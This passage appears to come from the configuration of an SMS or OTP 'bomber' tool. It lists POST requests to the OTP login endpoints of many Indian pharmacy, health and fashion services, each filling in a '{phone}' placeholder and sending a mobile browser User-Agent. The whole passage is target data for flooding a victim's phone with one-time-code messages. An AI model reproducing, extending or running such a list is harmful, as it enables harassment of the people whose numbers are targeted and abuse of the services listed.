      }
  },
  {
      "endpoint": "https://api.apollo247.com/api/v1/user/login/send-otp",
      "method": "POST",
      "payload": {"mobileNumber": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.pharmeasy.in/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"contactNumber": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.1mg.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.practo.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.netmeds.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.medlife.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.healthkart.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.myntra.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.ajio.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobileNumber": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.nykaa.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.purplle.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.bewakoof.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.koovs.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.limeroad.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.tatacliq.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobileNumber": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.firstcry.com/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  },
  {
      "endpoint": "https://api.hopscotch.in/api/v1/user/login/otp",
      "method": "POST",
      "payload": {"mobile_number": "{phone}"},
      "headers": {
          "Content-Type": "application/json",
          "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Mobile Safari/537.36"
      }
  }
];
